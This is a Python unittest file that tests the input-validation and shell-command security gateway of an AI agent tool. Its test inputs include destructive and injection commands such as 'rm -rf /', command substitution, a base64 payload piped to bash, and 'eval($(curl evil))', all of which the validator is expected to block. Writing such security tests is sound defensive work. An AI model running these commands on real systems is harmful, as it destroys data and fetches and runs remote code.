"""Verification tests for input gateway hardening (Phases 4-7 of INPUT_GATEWAY_DISSECTION)."""

import json
import os
import re
import tempfile
import unittest
from pathlib import Path
from typing import Any

from core._env import KEY_VALIDATOR, load_env_secure
from core.config import AgentConfig
from core.parser import (
    normalize,
    extract_command,
    extract_json_from_response,
    validate_tool_call,
    _validate_path,
    ToolCall,
    ValidationResult,
)
from core.security import (
    validate,
    is_safe_command,
    _dangerous_operators_unquoted,
    _tokenize,
    split_pipe_segments,
    _validate_segment_args,
)
from core.sanitize import sanitize
from tools.git_tool import GIT_ARG_VALIDATOR


# =============================================================================
# 1. ENV LOADER GATEWAY
# =============================================================================

class TestEnvLoaderGateway(unittest.TestCase):
    """Phase 4: env parser hardening — key validation + logging."""

    def test_valid_keys_accepted(self):
        self.assertTrue(KEY_VALIDATOR.match("NABD_WORKSPACE_ROOT"))
        self.assertTrue(KEY_VALIDATOR.match("OPENROUTER_API_KEY"))
        self.assertTrue(KEY_VALIDATOR.match("NABD_MAX_SESSIONS"))
        self.assertTrue(KEY_VALIDATOR.match("A"))

    def test_invalid_keys_rejected(self):
        self.assertFalse(KEY_VALIDATOR.match(""))           # empty
        self.assertFalse(KEY_VALIDATOR.match("1_START"))    # leading digit
        self.assertFalse(KEY_VALIDATOR.match("lowercase"))  # lowercase
        self.assertFalse(KEY_VALIDATOR.match("MIXED_case")) # mixed case
        self.assertFalse(KEY_VALIDATOR.match("KEY=VAL"))    # contains =
        self.assertFalse(KEY_VALIDATOR.match("KEY VAL"))    # contains space
        self.assertFalse(KEY_VALIDATOR.match("-NO_DASH"))   # leading dash

    def test_malformed_line_skipped(self):
        with tempfile.NamedTemporaryFile(mode="w", suffix=".env", delete=False) as f:
            f.write("# comment\n")
            f.write("MALFORMED_LINE_NO_EQUALS\n")
            f.write("=\n")
            f.write("NABD_VALID=ok\n")
            tmppath = f.name
        try:
            load_env_secure(tmppath)
            self.assertEqual(os.environ.get("NABD_VALID"), "ok")
            if "MALFORMED_LINE_NO_EQUALS" in os.environ:
                del os.environ["MALFORMED_LINE_NO_EQUALS"]
        finally:
            os.unlink(tmppath)


# =============================================================================
# 2. CONFIG GATEWAY
# =============================================================================

class TestConfigGateway(unittest.TestCase):
    """Phase 4: config integer clamping."""

    def test_max_sessions_clamped(self):
        config = AgentConfig(max_sessions=-1)
        self.assertEqual(config.max_sessions, 1)
        config2 = AgentConfig(max_sessions=9999)
        self.assertEqual(config2.max_sessions, 1000)

    def test_max_output_clamped(self):
        config = AgentConfig(max_output=999999)
        self.assertEqual(config.max_output, 100000)
        config2 = AgentConfig(max_output=-1)
        self.assertEqual(config2.max_output, 100)


# =============================================================================
# 3. TUI INPUT GATEWAY
# =============================================================================

class TestTuiInputGateway(unittest.TestCase):
    """Phase 4: TUI input length capping and sanitization."""

    def test_input_capped_at_10000(self):
        raw = "A" * 20000
        capped = sanitize(raw[:10000])
        self.assertEqual(len(capped), 10000)

    def test_input_sanitized(self):
        raw = "normal input \x00null\x1b[3JANSI"
        sanitized = sanitize(raw[:10000])
        self.assertNotIn("\x00", sanitized)
        self.assertNotIn("\x1b[3J", sanitized)

    def test_empty_input_handled(self):
        sanitized = sanitize(""[:10000])
        self.assertEqual(sanitized, "")


# =============================================================================
# 4. SHELL COMMAND VALIDATION GATEWAY (core.security + core.utils)
# =============================================================================

class TestShellValidationGateway(unittest.TestCase):
    """Phase 4-5: deterministic parsing, no shell injection, no ambiguity."""

    # --- Valid commands ---

    def test_simple_command(self):
        ok, reason = validate("ls -la")
        self.assertTrue(ok, f"Simple ls should pass: {reason}")

    def test_quoted_semicolon(self):
        ok, reason = validate("echo 'hello; world'")
        self.assertTrue(ok, f"Quoted semicolon should pass: {reason}")

    def test_unicode_command(self):
        ok, reason = validate("echo '🔍 unicode test'")
        self.assertTrue(ok, f"Unicode command should pass: {reason}")

    def test_piped_command(self):
        ok, reason = validate("ls | wc -l")
        self.assertTrue(ok, f"Pipe to wc should pass: {reason}")

    def test_quoted_pipe(self):
        ok, reason = validate("echo \"a|b\" | grep c")
        self.assertTrue(ok, f"Pipe with quoted pipe char should pass: {reason}")

    def test_git_push(self):
        ok, reason = validate("git push origin main")
        self.assertTrue(ok, f"Git push should pass: {reason}")

    def test_whitelisted_binary(self):
        ok, reason = validate("cat /workspace/file.txt")
        self.assertTrue(ok, f"Cat should pass: {reason}")

    def test_nested_quotes(self):
        ok, reason = validate("echo \"nested 'quotes' inside\"")
        self.assertTrue(ok, f"Nested quotes should pass: {reason}")

    # --- Injection vectors ---

    def test_semicolon_injection(self):
        ok, _ = validate("echo hello; rm -rf /")
        self.assertFalse(ok, "Semicolon command separator must be blocked")

    def test_backtick_injection(self):
        ok, _ = validate("echo `whoami`")
        self.assertFalse(ok, "Backtick substitution must be blocked")

    def test_command_substitution_injection(self):
        ok, _ = validate("echo $(whoami)")
        self.assertFalse(ok, "Command substitution $() must be blocked")

    def test_logical_and_injection(self):
        ok, _ = validate("ls && whoami")
        self.assertFalse(ok, "Logical AND && must be blocked")

    def test_logical_or_injection(self):
        ok, _ = validate("ls || whoami")
        self.assertFalse(ok, "Logical OR || must be blocked")

    def test_piping_into_interpreter(self):
        ok, _ = validate("ls | python3 -c 'print(1)'")
        self.assertFalse(ok, "Piping into interpreter must be blocked")

    def test_piping_into_bash(self):
        ok, _ = validate("echo test | bash")
        self.assertFalse(ok, "Piping into bash must be blocked")

    def test_piping_into_sh(self):
        ok, _ = validate("echo test | sh")
        self.assertFalse(ok, "Piping into sh must be blocked")

    def test_piping_into_node(self):
        ok, _ = validate("echo test | node")
        self.assertFalse(ok, "Piping into node must be blocked")

    def test_newline_injection(self):
        ok, _ = validate("ls\nrm -rf /")
        self.assertFalse(ok, "Newline inside command must be blocked")

    # --- Binary allowlist ---

    def test_banned_binary(self):
        ok, _ = validate("sudo rm -rf /")
        self.assertFalse(ok, "Non-whitelisted binary must be blocked")

    def test_absolute_path_outside_workspace(self):
        ok, _ = validate("python3 /etc/passwd")
        self.assertFalse(ok, "Python executing file outside workspace must be blocked")

    def test_banned_python_module(self):
        ok, _ = validate("python3 -m http.server")
        self.assertFalse(ok, "Banned python module must be blocked")

    def test_banned_python_subprocess_module(self):
        ok, _ = validate("python3 -m subprocess")
        self.assertFalse(ok, "Banned subprocess module must be blocked")

    # --- xargs (PATCH 5) ---

    def test_xargs_blocked(self):
        ok, _ = validate("xargs echo test")
        self.assertFalse(ok, "xargs command must be blocked")

    def test_xargs_false_positive_safe(self):
        """A file named xargs.txt must NOT trigger the xargs ban."""
        ok, reason = validate("cat xargs.txt")
        self.assertTrue(ok, f"cat xargs.txt should pass (not xargs): {reason}")

    # --- Empty / edge cases ---

    def test_empty_command(self):
        ok, _ = validate("")
        self.assertFalse(ok, "Empty command must be rejected")

    def test_whitespace_only(self):
        ok, _ = validate("   ")
        self.assertFalse(ok, "Whitespace-only command must be rejected")

    def test_oversized_command(self):
        cmd = "e" * 4097
        ok, _ = validate(cmd)
        self.assertFalse(ok, "Command exceeding max length must be rejected")

    def test_quoted_dollar_parenthesis_pass(self):
        """$() inside single quotes should pass."""
        ok, reason = validate("echo '$(whoami)'")
        self.assertTrue(ok, f"Quoted $() should pass: {reason}")

    def test_quoted_backtick_pass(self):
        """Backtick inside single quotes should pass."""
        ok, reason = validate("echo '`whoami`'")
        self.assertTrue(ok, f"Quoted backtick should pass: {reason}")

    def test_null_byte_in_command(self):
        """Null bytes should be stripped by sanitize before validation."""
        cmd = "ls\x00-la"
        ok, _ = validate(cmd)
        self.assertFalse(ok, "Command with null bytes should be blocked or handled")

    def test_shell_metacharacters_quoted(self):
        ok, reason = validate("echo 'test ; ` $() && ||'")
        self.assertTrue(ok, f"Quoted metacharacters should pass: {reason}")

    # --- Pipe segment tests ---

    def test_pipe_segments_quote_aware(self):
        ok, segments, err = split_pipe_segments('echo "a|b" | grep c')
        self.assertTrue(ok, f"Pipe split should succeed: {err}")
        self.assertEqual(len(segments), 2)
        # shlex strips quotes; the pipe inside quotes should NOT cause a split
        # segments[0] is ['echo', 'a|b'] — the quoted pipe is correctly preserved as part of the token
        self.assertEqual(len(segments[0]), 2)
        self.assertIn('a|b', segments[0][1])


# =============================================================================
# 5. PARSER GATEWAY (core.parser)
# =============================================================================

class TestParserGateway(unittest.TestCase):
    """Phase 4: deterministic JSON/bash parsing."""

    def test_extract_json_tool_call(self):
        response = '```json\n{"tool": "web_search", "args": {"query": "test"}}\n```'
        tc = extract_command(response)
        self.assertIsNotNone(tc)
        self.assertEqual(tc.tool, "web_search")
        self.assertEqual(tc.args["query"], "test")

    def test_extract_bash_tool_call(self):
        response = '```bash\nls -la\n```'
        tc = extract_command(response)
        self.assertIsNotNone(tc)
        self.assertEqual(tc.tool, "execute_shell")
        self.assertEqual(tc.args["command"], "ls -la")

    def test_hallucinated_python_tool_call_blocked(self):
        """The hallucination guard catches 'python ' (with trailing space) as start of command."""
        response = '```\npython import os; os.system("hack")\n```'
        tc = extract_command(response)
        self.assertIsNone(tc, "Hallucinated Python tool calls must be blocked")

    def test_empty_response(self):
        tc = extract_command("")
        self.assertIsNone(tc)

    def test_no_tool_call(self):
        tc = extract_command("Just a plain text response without any tool calls.")
        self.assertIsNone(tc)

    def test_extract_json_from_response(self):
        response = 'Some text\n```json\n{"key": "value"}\n```\nmore text'
        raw = extract_json_from_response(response)
        self.assertIsNotNone(raw)
        data = json.loads(raw)
        self.assertEqual(data["key"], "value")

    def test_normalize_unicode(self):
        raw = "𝐡𝐞𝐥𝐥𝐨"  # mathematical bold
        normalized = normalize(raw)
        self.assertEqual(normalized, "hello")

    def test_normalize_ansi_stripped(self):
        raw = "hello\x1b[31mworld\x1b[0m"
        normalized = normalize(raw)
        self.assertNotIn("\x1b", normalized)

    def test_validate_tool_call_missing_tool(self):
        vr = validate_tool_call('{"args": {}}')
        self.assertFalse(vr.ok)

    def test_validate_tool_call_unknown_tool(self):
        vr = validate_tool_call('{"tool": "hack", "args": {}}')
        self.assertFalse(vr.ok)

    def test_validate_tool_call_missing_required(self):
        vr = validate_tool_call('{"tool": "execute_shell", "args": {}}')
        self.assertFalse(vr.ok)

    def test_validate_tool_call_wrong_type(self):
        vr = validate_tool_call('{"tool": "execute_shell", "args": {"command": 123}}')
        self.assertFalse(vr.ok)

    def test_validate_tool_call_unexpected_arg(self):
        vr = validate_tool_call('{"tool": "execute_shell", "args": {"command": "ls", "malicious": "yes"}}')
        self.assertFalse(vr.ok)

    def test_validate_tool_call_max_length_exceeded(self):
        cmd = "A" * 5000
        vr = validate_tool_call(f'{{"tool": "execute_shell", "args": {{"command": "{cmd}"}}}}')
        self.assertFalse(vr.ok)

    def test_validate_tool_call_valid_shell(self):
        vr = validate_tool_call('{"tool": "execute_shell", "args": {"command": "ls -la"}}')
        self.assertTrue(vr.ok)

    def test_validate_tool_call_valid_fs(self):
        vr = validate_tool_call('{"tool": "file_system", "args": {"action": "read", "path": "test.txt"}}')
        self.assertTrue(vr.ok)

    def test_malformed_json(self):
        vr = validate_tool_call('{broken json}')
        self.assertFalse(vr.ok)

    def test_unicode_homoglyph_json(self):
        """Unicode homoglyphs in JSON tool names should be NFKC-normalized."""
        vr = validate_tool_call('{"tool": "ｅxecute_shell", "args": {"command": "ls"}}')
        # The tool name has fullwidth 'ｅ' which normalizes to 'e' but
        # TOOL_SCHEMAS keys use ASCII, so it won't match
        self.assertFalse(vr.ok)

    def test_nested_quote_json_payload(self):
        vr = validate_tool_call('{"tool": "execute_shell", "args": {"command": "echo \\"nested quote\\""}}')
        self.assertTrue(vr.ok)


# =============================================================================
# 6. GIT TOOL GATEWAY
# =============================================================================

class TestGitToolGateway(unittest.TestCase):
    """Phase 4: git_tool remote/branch validation."""

    def test_valid_remote_branch(self):
        self.assertTrue(GIT_ARG_VALIDATOR.match("origin"))
        self.assertTrue(GIT_ARG_VALIDATOR.match("main"))
        self.assertTrue(GIT_ARG_VALIDATOR.match("feature/branch-1.0"))
        self.assertTrue(GIT_ARG_VALIDATOR.match("upstream"))
        self.assertTrue(GIT_ARG_VALIDATOR.match("my.feature_branch"))

    def test_invalid_remote_branch(self):
        self.assertFalse(GIT_ARG_VALIDATOR.match("--exec-path=/tmp"))
        self.assertFalse(GIT_ARG_VALIDATOR.match("origin; rm -rf /"))
        self.assertFalse(GIT_ARG_VALIDATOR.match("$(whoami)"))
        self.assertFalse(GIT_ARG_VALIDATOR.match("`id`"))
        self.assertFalse(GIT_ARG_VALIDATOR.match("origin\nmain"))
        self.assertFalse(GIT_ARG_VALIDATOR.match("branch with spaces"))
        self.assertFalse(GIT_ARG_VALIDATOR.match(""))   # empty


# =============================================================================
# 7. SANITIZER GATEWAY
# =============================================================================

class TestSanitizerGateway(unittest.TestCase):
    """Phase 4: centralized sanitizer behavior."""

    def test_null_bytes_stripped(self):
        result = sanitize("hello\x00world")
        self.assertNotIn("\x00", result)

    def test_ansi_stripped(self):
        result = sanitize("\x1b[31mred\x1b[0m")
        self.assertNotIn("\x1b", result)

    def test_control_chars_stripped(self):
        result = sanitize("hello\x07world\x08!")
        self.assertNotIn("\x07", result)
        self.assertNotIn("\x08", result)

    def test_newlines_preserved_by_default(self):
        result = sanitize("line1\nline2\nline3")
        self.assertEqual(result.count("\n"), 2)

    def test_unicode_preserved(self):
        result = sanitize("hello 🔍 world")
        self.assertIn("🔍", result)

    def test_bytes_input(self):
        result = sanitize(b"hello")
        self.assertEqual(result, "hello")

    def test_none_input(self):
        result = sanitize(None)
        self.assertEqual(result, "")

    def test_osc_sequence_stripped(self):
        result = sanitize("hello\x1b]0;title\x07world")
        self.assertNotIn("\x1b", result)


# =============================================================================
# 8. SECURITY HELPER FUNCTIONS
# =============================================================================

class TestSecurityHelpers(unittest.TestCase):
    """Phase 4-5: low-level security component tests."""

    def test_tokenize_simple(self):
        ok, tokens, _ = _tokenize("ls -la")
        self.assertTrue(ok)
        self.assertEqual(tokens, ["ls", "-la"])

    def test_tokenize_unterminated_quote(self):
        ok, _, err = _tokenize("echo 'unterminated")
        self.assertFalse(ok)
        self.assertIn("Unterminated quote", err)

    def test_tokenize_pipe_as_token(self):
        ok, tokens, _ = _tokenize("ls | wc")
        self.assertTrue(ok)
        self.assertIn("|", tokens)

    def test_tokenize_quoted_pipe(self):
        ok, tokens, _ = _tokenize('echo "a|b"')
        self.assertTrue(ok)
        self.assertEqual(len(tokens), 2)

    def test_dangerous_operators_unquoted(self):
        ok, _ = _dangerous_operators_unquoted("echo hello; whoami")
        self.assertFalse(ok)

    def test_dangerous_operators_quoted_safe(self):
        ok, _ = _dangerous_operators_unquoted("echo 'hello; world'")
        self.assertTrue(ok)

    def test_validate_segment_args_empty(self):
        ok, _ = _validate_segment_args([])
        self.assertFalse(ok)

    def test_validate_segment_args_banned_flag(self):
        ok, _ = _validate_segment_args(["python3", "-c", "print(1)"])
        self.assertFalse(ok)


# =============================================================================
# 9. SESSION LOADER GATEWAY
# =============================================================================

class TestSessionGateway(unittest.TestCase):
    """Phase 4: bare except eradication in session loading."""

    def test_load_nonexistent_session(self):
        from core.session import SessionManager
        with tempfile.TemporaryDirectory() as tmpdir:
            sm = SessionManager(Path(tmpdir))
            result = sm.load("nonexistent_session")
            self.assertFalse(result)

    def test_save_and_load_roundtrip(self):
        from core.session import SessionManager
        with tempfile.TemporaryDirectory() as tmpdir:
            sm = SessionManager(Path(tmpdir))
            sm.messages = [{"role": "user", "content": "hello"}]
            ok = sm.save()
            self.assertTrue(ok)
            # Load into a new manager
            sm2 = SessionManager(Path(tmpdir))
            result = sm2.load(sm.session_id)
            self.assertTrue(result)
            self.assertEqual(len(sm2.messages), 1)
            self.assertEqual(sm2.messages[0]["content"], "hello")


# =============================================================================
# 10. BACKGROUND COMMAND (PATCH 6)
# =============================================================================

class TestBackgroundCommand(unittest.TestCase):
    """Phase 6: background trailing space fix."""

    def test_trailing_space_detected(self):
        cmd = "python3 long_script.py &   "
        self.assertTrue(cmd.rstrip().endswith("&"))

    def test_no_background(self):
        cmd = "python3 long_script.py"
        self.assertFalse(cmd.rstrip().endswith("&"))

    def test_background_exact(self):
        cmd = "sleep 10 &"
        self.assertTrue(cmd.rstrip().endswith("&"))


if __name__ == "__main__":
    unittest.main()


# =============================================================================
# 11. PHASE 2.1 — ADVANCED SECURITY HEURISTICS
# =============================================================================

class TestPhase21ObfuscationHeuristics(unittest.TestCase):
    """Phase2.1: decode/obfuscation payload blockers in _scan_full_argument_vector."""

    # --- decode / string-eval binaries banned anywhere in the vector ---

    def test_base64_binary_blocked(self):
        ok, reason = validate("echo dGVzdA== | base64 -d")
        self.assertFalse(ok, "base64 decode binary must be blocked")
        self.assertIn("base64", reason)

    def test_xxd_binary_blocked(self):
        ok, _ = validate("cat payload | xxd -r")
        self.assertFalse(ok, "xxd decode binary must be blocked")

    def test_openssl_decrypt_blocked(self):
        ok, _ = validate("openssl enc -d -in secret")
        self.assertFalse(ok, "openssl decode binary must be blocked")

    # --- interpreter string-eval flags ---

    def test_python_c_blocked(self):
        ok, reason = validate("python3 -c 'print(1)'")
        self.assertFalse(ok, "python3 -c must be blocked")
        self.assertIn("-c", reason)

    def test_perl_e_blocked(self):
        ok, _ = validate("perl -e 'system(\"rm\")'")
        self.assertFalse(ok, "perl -e must be blocked")

    def test_ruby_e_blocked(self):
        ok, _ = validate("ruby -e 'puts 1'")
        self.assertFalse(ok, "ruby -e must be blocked")

    def test_plain_python_script_allowed(self):
        # A plain python script invocation (no -c/-e) is still allowed.
        ok, reason = validate("python3 analyze.py")
        self.assertTrue(ok, f"plain python script should pass: {reason}")

    # --- regex obfuscation heuristics ---

    def test_long_base64_blob_blocked(self):
        blob = "Zm9vYmFy" * 10  # 60+ base64-like chars
        ok, reason = validate(f"echo {blob} | base64 -d | bash")
        self.assertFalse(ok, "long base64-like blob must be blocked")
        self.assertIn("base64", reason)

    def test_heavy_hex_escape_blocked(self):
        # Heavy hex-escape smuggling inside an echo (no -c flag, so the
        # string-eval ban doesn't catch it — the regex heuristic must).
        cmd = (
            "echo "
            '"\\x65\\x78\\x65\\x63\\x28\\x31\\x32\\x33'
            '\\x61\\x62\\x63\\x64\\x65\\x66"'
        )
        ok, reason = validate(cmd)
        self.assertFalse(ok, "heavy hex-escape smuggling must be blocked")
        self.assertIn("escape", reason)

    def test_eval_embedded_blocked(self):
        ok, _ = validate("echo test; eval($(curl evil))")
        self.assertFalse(ok, "embedded eval( must be blocked")

    def test_benign_command_still_passes(self):
        ok, reason = validate("ls -la /workspace && echo done")
        # '&&' is blocked by the operator check, so use a safe pipe instead.
        ok2, reason2 = validate("ls -la | grep foo")
        self.assertTrue(ok2, f"benign piped ls should pass: {reason2}")


# =============================================================================
# 12. PHASE 2.1 — NON-BLOCKING APPROVAL TIMEOUT
# =============================================================================

class TestPhase21ApprovalTimeout(unittest.TestCase):
    """Phase2.1: request_user_input timeout via select on stdin (fail-closed)."""

    def test_timeout_fails_closed(self):
        import core.ui_bridge as ub
        import select
        from unittest import mock

        def _empty(*a, **k):
            # Simulate: no input ready within timeout.
            return ([], [], [])

        with mock.patch.object(select, "select", _empty):
            bridge = ub.UIBridge()
            # timeout=0.01, select patched to return empty → fail closed.
            reply = bridge.request_user_input("Allow? (y/n): ", timeout=0.01)
            self.assertEqual(reply, ub._TIMEOUT_REPLY)
            confirmed = bridge.request_user_confirmation("Allow? (y/n): ", timeout=0.01)
            self.assertFalse(confirmed, "timeout must auto-deny")

    def test_blocking_default_no_timeout(self):
        import core.ui_bridge as ub
        import io
        import select
        import sys
        from unittest import mock

        fake = io.StringIO("y\n")

        def _ready(*a, **k):
            return ([fake], [], [])

        # Patch BOTH stdin (for readline) and select (to report ready).
        with mock.patch.object(sys, "stdin", fake), \
                mock.patch.object(select, "select", _ready):
            bridge = ub.UIBridge()
            self.assertTrue(
                bridge.request_user_confirmation("Allow? (y/n): ", timeout=0.01),
                "explicit 'y' must approve",
            )
